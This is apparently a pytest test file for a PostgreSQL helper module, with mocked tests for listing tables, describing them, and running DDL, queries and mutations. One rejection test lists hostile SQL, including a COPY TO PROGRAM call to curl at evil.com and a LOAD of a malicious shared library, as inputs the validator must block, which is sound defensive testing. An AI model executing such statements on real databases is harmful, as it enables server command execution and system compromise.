from unittest.mock import MagicMock, patch

import pytest

from mnemolith.pg_store import (
    list_tables,
    describe_table,
    execute_ddl,
    execute_query,
    execute_mutate,
)


@pytest.fixture
def mock_pool():
    pool = MagicMock()
    conn = MagicMock()
    cursor = MagicMock()
    pool.connection.return_value.__enter__ = MagicMock(return_value=conn)
    pool.connection.return_value.__exit__ = MagicMock(return_value=False)
    conn.cursor.return_value.__enter__ = MagicMock(return_value=cursor)
    conn.cursor.return_value.__exit__ = MagicMock(return_value=False)
    conn.execute.return_value = cursor
    return pool, conn, cursor


def test_list_tables(mock_pool):
    pool, conn, cursor = mock_pool
    cursor.fetchall.return_value = [("groceries",), ("todos",)]
    result = list_tables(pool)
    assert result == ["groceries", "todos"]


def test_list_tables_empty(mock_pool):
    pool, conn, cursor = mock_pool
    cursor.fetchall.return_value = []
    result = list_tables(pool)
    assert result == []


def test_describe_table(mock_pool):
    pool, conn, cursor = mock_pool
    cursor.fetchall.return_value = [
        ("id", "integer", "NO"),
        ("name", "text", "YES"),
    ]
    result = describe_table(pool, "groceries")
    assert len(result) == 2
    assert result[0] == {"column": "id", "type": "integer", "nullable": "NO"}
    assert result[1] == {"column": "name", "type": "text", "nullable": "YES"}


@pytest.mark.parametrize("sql", [
    "CREATE TABLE test (id int)",
    "  create table test (id int)",
    "ALTER TABLE test ADD COLUMN name text",
    "DROP TABLE test",
    "DROP TABLE IF EXISTS test CASCADE",
])
def test_execute_ddl_allows_valid_ddl(mock_pool, sql):
    pool, conn, cursor = mock_pool
    execute_ddl(pool, sql)
    conn.execute.assert_called_once()


@pytest.mark.parametrize("sql", [
    "SELECT 1",
    "INSERT INTO test VALUES (1)",
    "COPY test TO PROGRAM 'curl evil.com'",
    "CREATE EXTENSION dblink",
    "DROP DATABASE mnemolith",
    "LOAD '/tmp/evil.so'",
])
def test_execute_ddl_rejects_non_ddl(mock_pool, sql):
    pool, conn, cursor = mock_pool
    with pytest.raises(ValueError, match="Only CREATE TABLE"):
        execute_ddl(pool, sql)


def test_execute_query(mock_pool):
    pool, conn, cursor = mock_pool
    cursor.description = [("id",), ("name",)]
    cursor.fetchall.return_value = [(1, "milk"), (2, "bread")]
    result = execute_query(pool, "SELECT * FROM groceries")
    assert result == [
        {"id": 1, "name": "milk"},
        {"id": 2, "name": "bread"},
    ]


def test_execute_query_no_results(mock_pool):
    pool, conn, cursor = mock_pool
    cursor.description = [("id",), ("name",)]
    cursor.fetchall.return_value = []
    result = execute_query(pool, "SELECT * FROM groceries")
    assert result == []


def test_execute_mutate(mock_pool):
    pool, conn, cursor = mock_pool
    cursor.rowcount = 3
    result = execute_mutate(pool, "DELETE FROM groceries WHERE done = true")
    assert result == 3
